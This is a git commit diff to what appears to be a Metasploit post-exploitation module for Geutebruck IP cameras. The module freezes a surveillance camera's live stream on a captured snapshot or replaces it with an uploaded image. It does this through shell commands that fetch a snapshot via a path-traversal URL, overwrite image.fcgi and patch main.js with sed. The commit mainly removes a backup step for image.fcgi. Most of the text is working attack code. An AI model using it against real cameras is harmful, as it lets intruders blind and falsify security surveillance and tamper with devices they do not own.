ad2cc6a1fef44a1bf392247f69b623f689dbc9c5
Your Name <ibrahim.ayadhi@insat.u-carthage.tn>
2021-09-03 12:30:12 +0100

    Fixed Module logic

--- modules/post/linux/manage/geutebruck_post_exp.rb
+++ modules/post/linux/manage/geutebruck_post_exp.rb
@@ -50,7 +50,6 @@ class MetasploitModule < Msf::Post
   end
 
   def action_freeze_camera
-    backup_image_fcgi
     print_status('Taking a snapshot of the current stream to use as the static image to freeze the stream on...')
     cmd_exec('curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi')
     print_status('Freezing the stream on the captured image...')
@@ -61,7 +60,6 @@ class MetasploitModule < Msf::Post
   def action_change_image
     fail_with(Failure::BadConfig, 'The CHANGE_IMAGE action requires the IMAGE option to be set!') if datastore['IMAGE'].blank?
     fail_with(Failure::BadConfig, 'The image path specified by IMAGE does not exist!') unless ::File.exist?(datastore['IMAGE'])
-    backup_image_fcgi
     print_status('Uploading a custom image...')
     upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])
     pwn_main_js
@@ -69,11 +67,10 @@ class MetasploitModule < Msf::Post
   end
 
   def action_resume_stream
-    print_status('Restoring image.fcgi...')
-    unless file_exist?('/usr/www/uapi-cgi/viewer/image.fcgi.bak')
-      fail_with(Failure::NoTarget, "/usr/www/uapi-cgi/viewer/image.fcgi.bak doesn't exist on the target, did you run FREEZE_CAMERA or CHANGE_IMAGE actions yet?")
+    print_status('Resuming stream...')
+    unless file_exist?('/usr/www/viewer/js/main.js.bak')
+      fail_with(Failure::NoTarget, "/usr/www/viewer/js/main.js.bak doesn't exist on the target, did you run FREEZE_CAMERA or CHANGE_IMAGE actions yet?")
     end
-    move_file('/usr/www/uapi-cgi/viewer/image.fcgi.bak', '/usr/www/uapi-cgi/viewer/image.fcgi')
     print_status('Restoring main.js backup...')
     move_file('/usr/www/viewer/js/main.js.bak', '/usr/www/viewer/js/main.js')
     print_status('Restored! Stream back to a normal state.')
@@ -86,11 +83,5 @@ class MetasploitModule < Msf::Post
     print_status('Using the new main.js...')
     cmd_exec("sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\"/uapi-cgi/viewer/image.fcgi\"' -i /usr/www/viewer/js/main2.js")
     move_file('/usr/www/viewer/js/main2.js', '/usr/www/viewer/js/main.js')
-  end
-
-  def backup_image_fcgi
-    print_status('Backing up image.fcgi...')
-    fail_with(Failure::NoTarget, "/usr/www/uapi-cgi/viewer/image.fcgi doesn't exist on the target!") unless file_exist?('/usr/www/uapi-cgi/viewer/image.fcgi')
-    copy_file('/usr/www/uapi-cgi/viewer/image.fcgi', '/usr/www/uapi-cgi/viewer/image.fcgi.bak')
   end
 end
